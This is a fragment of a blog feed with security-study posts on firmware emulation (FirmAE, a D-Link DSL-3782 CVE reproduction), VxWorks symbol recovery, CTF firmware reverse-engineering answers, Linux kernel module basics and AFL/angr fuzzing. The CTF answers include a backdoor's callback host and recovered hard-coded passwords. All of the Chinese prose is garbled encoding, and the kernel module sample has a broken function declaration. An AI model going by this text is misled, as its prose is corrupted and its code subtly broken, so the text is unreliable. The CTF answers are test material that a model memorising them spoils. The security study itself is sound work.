    <content type="html"><![CDATA[<h3 id="FirmAEå®‰è£…"><a href="#FirmAEå®‰è£…" class="headerlink" title="FirmAEå®‰è£…"></a>FirmAEå®‰è£…</h3><p><code>https://github.com/pr0v3rbs/FirmAExu</code></p><p>éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ol><li>git cloneæ—¶è®°å¾—recursiveï¼Œä¸èƒ½git cloneå°±æŠŠ routersploitè¿™ä¸ªåº“å¤åˆ¶åˆ°<code>./analysis</code>é‡Œ</li><li><code>download.sh</code>é‡Œçš„ä¸‹è½½æœ€å¥½è‡ªå·±ä¸‹æ¥å¤åˆ¶åˆ°<code>./binaries</code>é‡Œ</li><li><code>install.sh</code>ä¸­ open-jdk-8å’Œfusecramæ²¡æ³•ç›´æ¥ä»aptå®‰è£…ï¼ˆæš‚æ—¶å½“å®ƒä¸å­˜åœ¨ï¼‰</li></ol><h3 id="DLink-DSL-3782æ¼æ´å¤ç°"><a href="#DLink-DSL-3782æ¼æ´å¤ç°" class="headerlink" title="DLink DSL-3782æ¼æ´å¤ç°"></a>DLink DSL-3782æ¼æ´å¤ç°</h3><p>å›ºä»¶åœ°å€ï¼š<a href="https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip">https://media.dlink.eu/support/products/dsl/dsl-3782/driver_software/dsl-3782_a1_eu_1.01_07282016.zip</a></p><p>å‚è€ƒæ–¹æ³•ï¼š<a href="https://bbs.kanxue.com/thread-278413.htm">https://bbs.kanxue.com/thread-278413.htm</a></p><p>å…ˆç›´æ¥æŠŠå›ºä»¶è·‘èµ·æ¥ï¼ŒæŠ„ä¸€ä¸‹expè¯•ä¸€è¯•ï¼š</p><p><img src="/img/CVE-2023-27216/1.jpg"></p><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a><strong>æ¼æ´åŸç†</strong></h4>]]></content>
    
    
    <categories>
      
      <category>å›ºä»¶ä»¿çœŸ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VxWorkså›ºä»¶å‡½æ•°ç¬¦å·æ¢å¤ã€å›ºä»¶åŠ è½½åœ°å€è¯†åˆ«</title>
    <link href="/2023/05/12/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/Vxworks/"/>
    <url>/2023/05/12/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/Vxworks/</url>
    
    <content type="html"><![CDATA[<h3 id="å›ºä»¶æå–"><a href="#å›ºä»¶æå–" class="headerlink" title="å›ºä»¶æå–"></a>å›ºä»¶æå–</h3><p><img src="/img/VxWorks/1.jpg"></p><p>å‚è€ƒæ–‡ç«  <a href="https://writeup.ctfhub.com/Challenge/2020/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%B5%8E%E5%8D%97%E7%AB%99/pka8PC6FDDQC7A8Nk5yYNS.html">CTFHUB-WriteUp</a></p><p>binwalkæå–å‡ºåä¸º385çš„å›ºä»¶ï¼Œç¡®å®šæ˜¯VxWorkså†…æ ¸ï¼Œå¹¶ä¸”å¸¦æœ‰ç¬¦å·è¡¨</p><p><img src="/img/VxWorks/2.jpg"></p><p>ç„¶åç”¨binwalk -A ç¡®å®šæ¶æ„å’Œå¤§å°ç«¯</p><p><img src="/img/VxWorks/3.jpg"></p><h3 id="ç¬¦å·è¡¨"><a href="#ç¬¦å·è¡¨" class="headerlink" title="ç¬¦å·è¡¨"></a>ç¬¦å·è¡¨</h3><p>ä»binwalkç»“æœå¯ä»¥çœ‹å‡ºç¬¦å·è¡¨åœ¨<code>0x301E74</code>é™„è¿‘ï¼ˆè¿™ä¸ä¸€å®šæ˜¯çœŸå®å€¼ï¼‰</p><p><img src="/img/VxWorks/4.jpg"></p><p>VxWorksç¬¦å·è¡¨æ¯ä¸€é¡¹ç”±4éƒ¨åˆ†ç»„æˆï¼Œ0-3å­—èŠ‚æ˜¯4ä¸ª<code>00</code>ï¼Œ4-7å­—èŠ‚æ˜¯ç¬¦å·å­—ç¬¦ä¸²æ‰€åœ¨å†…å­˜åœ°å€ï¼Œ8-11æ˜¯ç¬¦å·å¯¹åº”çš„å†…å®¹æ‰€åœ¨åœ°å€ï¼Œ12-15å­—èŠ‚è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆç±»å‹çš„ç¬¦å·ã€‚</p><p>å¦‚ä¸Šå›¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç¬¦å·åœ°å€åœ¨<code>0x27655C</code>ï¼Œå†…å®¹åœ¨<code>0x1FF058</code>ï¼Œç±»å‹ä¸ºå‡½æ•°ï¼ˆ0x500ï¼‰çš„ä¸€ä¸ªç¬¦å·</p><p>å‡½æ•°åå­—</p><p>writeupé‡Œè¯´å¯ä»¥åœ¨è¿™ä¸¤ä¸ªåœ°å€ä¸Šç›´æ¥çœ‹åˆ°å¯¹åº”çš„å†…å®¹ï¼Œä½†æˆ‘çš„idaé‡Œè¿™ä¸¤ä¸ªåœ°å€ä¸Šçš„ä¸œè¥¿æ˜¾ç„¶ä¸å¯¹ã€‚ã€‚ã€‚æš‚ç•™é—®é¢˜</p><p>ï¼ˆå¹¶ä¸”idaç›´æ¥åŠ è½½æˆ‘è¿™é‡Œä¸€ä¸ªå‡½æ•°éƒ½æ²¡æœ‰ï¼Œä¸çŸ¥é“å’Œwriteupä½¿ç”¨çš„å·®åˆ«åœ¨å“ªâ€¦ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>å›ºä»¶ä»¿çœŸ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å›ºä»¶é€†å‘</title>
    <link href="/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/"/>
    <url>/2023/05/10/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/ctf-firmware/</url>
    
    <content type="html"><![CDATA[<h4 id="é¢˜ç›®1-buuctf-firmware"><a href="#é¢˜ç›®1-buuctf-firmware" class="headerlink" title="é¢˜ç›®1-buuctf-firmware"></a>é¢˜ç›®1-buuctf-firmware</h4><p><a href="https://buuoj.cn/challenges#firmware">https://buuoj.cn/challenges#firmware</a></p><p><img src="/img/firmware/1.jpg"></p><p>ä½¿ç”¨binwalkæå–å›ºä»¶</p><p><img src="/img/firmware/2.jpg"></p><p>å¯ä»¥æ‰¾åˆ°squashfsæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”å¯ä»¥åœ¨/tmpè·¯å¾„ä¸‹å¯ä»¥æ‰¾åˆ°åä¸ºbackdoorçš„ç¨‹åº</p><p><img src="/img/firmware/3.jpg"></p><p>ç”¨upxè„±å£³åå¯»æ‰¾ç±»ä¼¼ç½‘å€çš„å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°ä»¥ä¸‹ä¸‰ä¸ª</p><p><img src="/img/firmware/4.jpg"></p><p>é¦–å…ˆçœ‹ç¬¬ä¸€ä¸ªï¼Œå®ƒå‡ºç°åœ¨initConnectionè¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å»ºç«‹äº†è¿™ä¸ªurlçš„36667ç«¯å£é“¾æ¥ï¼Œå¤§æ¦‚ç‡é¢˜ç›®æ‰¾çš„å°±æ˜¯è¿™ä¸ª</p><p><img src="/img/firmware/5.jpg"></p><p>ç¬¬äºŒä¸ªã€ç¬¬ä¸‰ä¸ªåªå‡ºç°åœ¨sendå‡½æ•°å‘é€çš„å­—ç¬¦ä¸²é‡Œï¼Œæ˜¾ç„¶ä¸å¯¹</p><p><img src="/img/firmware/6.jpg"></p><p><img src="/img/firmware/7.jpg"></p><p>å› æ­¤flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}</p><h4 id="é¢˜ç›®2-CTFHUB-äºŒæ¬¡è®¾å¤‡å›ºä»¶é€†å‘"><a href="#é¢˜ç›®2-CTFHUB-äºŒæ¬¡è®¾å¤‡å›ºä»¶é€†å‘" class="headerlink" title="é¢˜ç›®2-CTFHUB-äºŒæ¬¡è®¾å¤‡å›ºä»¶é€†å‘"></a>é¢˜ç›®2-CTFHUB-äºŒæ¬¡è®¾å¤‡å›ºä»¶é€†å‘</h4><p>ç›´æ¥æ‰“å¼€æä¾›çš„å‹ç¼©åŒ…ï¼Œåªæœ‰ä¸€ä¸ªhomeæ–‡ä»¶å¤¹ï¼Œç”±äºé¢˜ç›®ä¸­è¯´è¦æ‰¾ç¡¬ç¼–ç å­—ç¬¦ä¸²ï¼Œç›´æ¥åœ¨æ–‡ä»¶å¤¹é‡Œæœç´¢passwordä¹‹ç±»çš„å­—ç¬¦ä¸²</p><p><img src="/img/firmware/8.jpg"></p><p>æ‰“å¼€JZPHMISystemï¼Œæœç´¢passwordå­—ç¬¦ä¸²</p><p><img src="/img/firmware/9.jpg"></p><p>æŒ‰xæ‰¾å¼•ç”¨åˆ°è¿™é‡Œï¼Œå‘ç°äº†ä¸€ä¸ªå«åšinputPasswordçš„å‡½æ•°</p><p><img src="/img/firmware/10.jpg"></p><p>è¿™ä¸ªå‡½æ•°è°ƒç”¨äº†InputPwd_proï¼Œç„¶ååœ¨è¿™ä¸ªå‡½æ•°é‡Œæ‰¾ç±»ä¼¼strcmpçš„å‡½æ•°</p><p><img src="/img/firmware/11.jpg"></p><p>åŒå‡»è¿™ä¸ª689078å­—ç¬¦ä¸²ï¼Œå‘ç°ä»–çš„åå­—å«åšrootPasswdï¼Œé‚£ä¹ˆçŒœæµ‹å¯èƒ½è¿™ä¸ªå°±æ˜¯é¢˜ç›®è¦æ±‚çš„å¯†ç </p><p>ç„¶åæ‰“å¼€å¦ä¸€ä¸ªèƒ½æœåˆ°passwordçš„æ–‡ä»¶ï¼Œå‘ç°è¿™ä¸¤ä¸ªå‡ ä¹æ˜¯åŒæ ·çš„ç»“æ„æµç¨‹</p><p>åªä¸è¿‡åœ¨rootPasswdè¿™é‡Œå­˜åœ¨åŒºåˆ«</p><p><img src="/img/firmware/12.jpg"></p><p>æŠŠè¿™ä¸ªicspwdæäº¤ä¸Šå»å°±æ˜¯å¯¹çš„ã€‚ã€‚ã€‚å‰é¢é‚£ä¸ª689078å°±ä¸è¡Œ</p><h4 id="é¢˜ç›®3-CTFHUB-ç®€å•çš„å›ºä»¶é€†å‘åˆ†æ"><a href="#é¢˜ç›®3-CTFHUB-ç®€å•çš„å›ºä»¶é€†å‘åˆ†æ" class="headerlink" title="é¢˜ç›®3-CTFHUB-ç®€å•çš„å›ºä»¶é€†å‘åˆ†æ"></a>é¢˜ç›®3-CTFHUB-ç®€å•çš„å›ºä»¶é€†å‘åˆ†æ</h4><p>ç”¨treeæŸ¥çœ‹æ–‡ä»¶ç»“æ„ä¹‹åå‘ç°æœ‰ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶åªæœ‰ä¸€ä¸ª<code>wwwroot/conf/exec/NOE7701.bin</code></p><p>ä½¿ç”¨binwalkæå–å‡ºæ¥217å’Œ217.zlibä¸¤ä¸ªæ–‡ä»¶</p><p>ç”¨binwalk -AæŸ¥çœ‹217çš„æ¶æ„ï¼Œå‘ç°æ˜¯PowerPC big-endian</p><p><img src="/img/firmware/13.jpg"></p><p>æ¥ä¸‹æ¥è¯†åˆ«å›ºä»¶çš„åŠ è½½åœ°å€ï¼Œé€šå¸¸vxworkså†…æ ¸åŠ è½½åœ°å€ä¸º0x10000ï¼Œä½†æ˜¯å…³äºå¦‚ä½•éªŒè¯ï¼Œè§ <a href="https://www.cnblogs.com/yangmzh3/p/11231423.html">https://www.cnblogs.com/yangmzh3/p/11231423.html</a></p><p><img src="/img/firmware/13_.jpg"></p><p>ç”¨idaæ‰“å¼€ï¼Œé€‰æ‹©PowerPC big-endian[PPC]ï¼Œä½¿ç”¨0x10000ä½œä¸ºå›ºä»¶åŠ è½½åœ°å€</p><p><img src="/img/firmware/14.jpg"></p><p><img src="/img/firmware/15.jpg"></p><p>å‘ç°idaè¯†åˆ«ä¸å‡ºæ¥å‡½æ•°ï¼Œç”±äºå›ºä»¶é‡Œç¼–å…¥äº†ç¬¦å·è¡¨ï¼Œå¯ä»¥æ‰‹åŠ¨æ¢å¤å‡½æ•°å</p><p>ä»ç½‘ä¸Šæ‰¾äº†è¿™ä¸ªidcè„šæœ¬ï¼Œç”¨äºæ¢å¤VxWorksç¬¦å·è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* è„šæœ¬å†…å®¹ */</span><br><span class="hljs-comment">/* Ruben Santamarta - IOActive */</span><br><span class="hljs-comment">/* Rebuild VxWorks Symbol Table */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;idc.idc&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>     <span class="hljs-keyword">auto</span> load_addr;<br> <span class="hljs-keyword">auto</span> ea;<br> <span class="hljs-keyword">auto</span> offset;<br> <span class="hljs-keyword">auto</span> sName;<br> <span class="hljs-keyword">auto</span> eaStart;<br> <span class="hljs-keyword">auto</span> eaEnd; <br><br><span class="hljs-comment">// You&#x27;ll need to adjust these values</span><br>load_addr = <span class="hljs-number">0x10000</span>; <span class="hljs-comment">/* åŠ è½½åœ°å€ */</span> <br>eaStart = <span class="hljs-number">0x301E74</span> + load_addr; <span class="hljs-comment">/* ç¬¦å·è¡¨èµ·å§‹åœ° */</span><br>eaEnd = <span class="hljs-number">0x3293b4</span> + load_addr; <span class="hljs-comment">/* ç¬¦å·è¡¨ç»“æŸåœ°å€ */</span><br><br> SetStatus(IDA_STATUS_WORK);<br> ea = eaStart;<br> <br> <span class="hljs-keyword">while</span>( ea &lt; eaEnd) &#123;<br> MakeDword( ea );<br> offset = <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">if</span> ( Dword( ea ) == <span class="hljs-number">0x900</span> || Dword( ea ) == <span class="hljs-number">0x500</span>)<br> &#123;<br> offset = <span class="hljs-number">8</span>;<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( Dword( ea ) == <span class="hljs-number">0x90000</span> || Dword( ea ) == <span class="hljs-number">0x50000</span> )<br> &#123;<br> offset = <span class="hljs-number">0xc</span>;<br> &#125; <br> <span class="hljs-keyword">if</span>( offset )<br> &#123;<br> MakeStr( Dword( ea - offset ), BADADDR); <br> sName = GetString( Dword( ea - offset ), <span class="hljs-number">-1</span>, ASCSTR_C ) ; <br>  <span class="hljs-keyword">if</span> ( sName )<br>  &#123;<br>  <span class="hljs-keyword">if</span>( Dword( ea ) == <span class="hljs-number">0x500</span> || Dword( ea ) == <span class="hljs-number">0x50000</span>)<br>  &#123;<br>      <span class="hljs-keyword">if</span> (  GetFunctionName( Dword( ea - offset + <span class="hljs-number">4</span>) ) == <span class="hljs-string">&quot;&quot;</span> )<br>      &#123;<br>      MakeCode( Dword( ea - offset + <span class="hljs-number">4</span>) );<br> MakeFunction( Dword( ea - offset + <span class="hljs-number">4</span>), BADADDR );<br>      &#125;<br>      &#125;<br>  MakeName( Dword( ea - offset + <span class="hljs-number">4</span> ), sName );  <br>  &#125;<br> &#125;<br> ea = ea + <span class="hljs-number">4</span>;   <br> &#125;<br> <br> SetStatus(IDA_STATUS_READY);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¼å…¥ä¹‹åå‡½æ•°ç¡®å®æ¢å¤å‡ºæ¥äº†</p><p>å¦‚æœç›´æ¥æœftpuserå­—ç¬¦ä¸²ï¼Œå®ƒä¸‹é¢è¿™ä¸ªå°±æ˜¯å¯†ç ï¼Œä¹Ÿå°±æ˜¯flagç­”æ¡ˆâ€¦</p><p><img src="/img/firmware/16.jpg"></p><p>ä¸åšå…·ä½“åˆ†æäº†ï¼ˆä»£ç å¤ªå¤š</p>]]></content>
    
    
    <categories>
      
      <category>å›ºä»¶ä»¿çœŸ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux kernel å­¦ä¹ </title>
    <link href="/2023/05/01/linux%20kernel/linux%20kernel/"/>
    <url>/2023/05/01/linux%20kernel/linux%20kernel/</url>
    
    <content type="html"><![CDATA[<h3 id="ubuntuæºç ç¼–è¯‘å®‰è£…"><a href="#ubuntuæºç ç¼–è¯‘å®‰è£…" class="headerlink" title="ubuntuæºç ç¼–è¯‘å®‰è£…"></a>ubuntuæºç ç¼–è¯‘å®‰è£…</h3><p>ä¸‹è½½ï¼š<a href="https://www.kernel.org/">https://www.kernel.org</a></p><p>å¿…è¦çš„ç¼–è¯‘ç¯å¢ƒï¼Œç¦ç”¨è¯ä¹¦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install gcc g++ clang cmake make flex bison libssl-dev<br>sudo apt-get install openssl<br>sudo apt-get install libssl-dev libelf-dev <br>./scripts/config --disable SYSTEM_TRUSTED_KEYS<br>./scripts/config --disable SYSTEM_REVOCATION_KEYS<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘çš„é…ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make menuconfig # æœ€å¤§åŒ–ç»ˆç«¯ï¼Œå¦åˆ™å›¾å½¢ç•Œé¢æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œä½¿ç”¨é»˜è®¤é…ç½®ç›´æ¥saveç„¶åexit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å¦‚æœä¸æŠŠEnbale loadable module support å‹¾ä¸Šï¼Œç”Ÿæˆçš„.configå°±ä¸èƒ½modules_install</span><br>sudo make -j4 #ä»£è¡¨ç¼–è¯‘çº¿ç¨‹ä¸ªæ•°<br></code></pre></td></tr></table></figure><p>å®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo make modules_install<br>sudo make install<br></code></pre></td></tr></table></figure><p>æ‰“å¼€å¼•å¯¼èœå•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gedit /etc/default/grub # æ³¨é‡Šhiddené¡¹ï¼Œä¿®æ”¹åœç•™æ—¶é—´GRUB_TIMEOUT=10<br>sudo update-grub<br>sudo reboot<br></code></pre></td></tr></table></figure><p><img src="/img/kernel/1.jpg"></p><p>å¤šå‡ºäº†æ–°å®‰è£…çš„6.3.1çš„kernel</p><p>é‡å¯ä¹‹å<code>uname -ra</code>ä¼šå‘ç°å†…æ ¸ç‰ˆæœ¬å˜äº†</p><h3 id="é©±åŠ¨ç¨‹åºç¼–å†™"><a href="#é©±åŠ¨ç¨‹åºç¼–å†™" class="headerlink" title="é©±åŠ¨ç¨‹åºç¼–å†™"></a>é©±åŠ¨ç¨‹åºç¼–å†™</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;haidragon BSD/GPL&quot;</span>);<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hello_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>printk(KERN_EMERG <span class="hljs-string">&quot;Load Hello World\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> hello <span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_EMERG <span class="hljs-string">&quot;Remove Hello world\n&quot;</span>);<br>&#125;<br><br>module_init(hello_init);<br>module_exit(hello_exit);<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#Makefile</span><br>KDIR:= /lib/modules/6.3.1/build<br><span class="hljs-section">all:</span><br>make -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><span class="hljs-section">clean:</span><br>rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å‡ºæ¥çš„<code>hello.ko</code>ï¼Œç”¨<code>insmod</code>å®‰è£…ï¼Œç”¨<code>rmmod</code>å¸è½½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo insmod ./hello.ko<br>tail /var/log/kern.log #æŸ¥çœ‹æ—¥å¿—<br>sudo rmmod ./hello.ko<br>tail /var/log/kern.log #æŸ¥çœ‹æ—¥å¿—<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é©±åŠ¨å¼€å‘</tag>
      
      <tag>kernelæ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FUZZ-AFL</title>
    <link href="/2023/03/15/fuzz/fuzz/"/>
    <url>/2023/03/15/fuzz/fuzz/</url>
    
    <content type="html"><![CDATA[<h3 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h3><p>å®‰è£…afl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install afl<br></code></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªåœ¨ç‰¹å®šè¾“å…¥ä¼šå´©æºƒçš„ç¨‹åº <code>c1.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> ptr[<span class="hljs-number">20</span>];<br>cin&gt;&gt;ptr;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(ptr,<span class="hljs-string">&quot;deadbeef&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">abort</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨afl-g++ç¼–è¯‘ï¼Œè¿™æ ·ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºä¼šè¢«æ’æ¡©</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-g++ -g c1.cpp -o c1.out<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ª<code>input_folder</code>ï¼Œè¿™é‡Œ<code>input_folder</code>é‡Œå…ˆéšä¾¿æ”¾ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶<code>abc</code>ï¼Œé‡Œé¢å†™å…¥<code>hello</code>ã€‚</p><p>å†åˆ›å»ºä¸€ä¸ª<code>output_folder</code>ï¼Œä»€ä¹ˆéƒ½ä¸ç”¨æ”¾è¿›å»</p><p>å¼€å§‹å¯¹å¾—åˆ°çš„ç¨‹åºè¿›è¡Œfuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i ./input_folder -o ./output_folder c1.out<br></code></pre></td></tr></table></figure><blockquote><p>å› ä¸ºaflåœ¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„æ—¶å€™æ˜¯å°†è¿™ä¸ª<code>input_folder</code>é‡Œçš„æ–‡ä»¶ä½œä¸ºè¾“å…¥ï¼Œç„¶åå¯¹ç»™å®šçš„è¾“å…¥ä½¿ç”¨é—ä¼ ç®—æ³•ä¸æ–­è¿›è¡Œå˜åŒ–ï¼Œå°†å˜åŒ–å‡ºæ¥çš„ç»“æœç»§ç»­è¾“å…¥ç»™ç¨‹åºï¼Œå› æ­¤ï¼Œè™½ç„¶éšä¾¿è¾“å…¥ä»€ä¹ˆéƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¾“å…¥çš„å†…å®¹ä¸ç¨‹åºå´©æºƒçš„è¾“å…¥è¶Šæ¥è¿‘ï¼Œåˆ™aflå¾—åˆ°ç»“æœçš„é€Ÿåº¦è¶Šå¿«ã€‚</p></blockquote><h3 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h3><p>å®‰è£…angrï¼šç›´æ¥ç”¨dockerï¼Œdockerhubä¸Šæœ‰angrçš„é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker pull angr/angr<br>sudo docker run (--net host) -it angr/angr bash<br></code></pre></td></tr></table></figure><p>angrçš„ç®€å•ä¾‹å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&#x27;/bin/true&#x27;</span>) <span class="hljs-comment"># /bin/trueæ˜¯linuxçš„ä¸€ä¸ªæ°¸è¿œreturn 0çš„ç¨‹åº</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex <span class="hljs-comment"># å°†è¾“å‡ºè½¬ä¸º16è¿›åˆ¶ï¼Œä½†æ˜¯dockeré‡Œå¹¶ä¸è‡ªå¸¦ï¼Œè¦pip installä¸€ä¸‹</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch<br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<br><span class="hljs-number">0x401670</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename<br><span class="hljs-string">&#x27;/bin/true&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
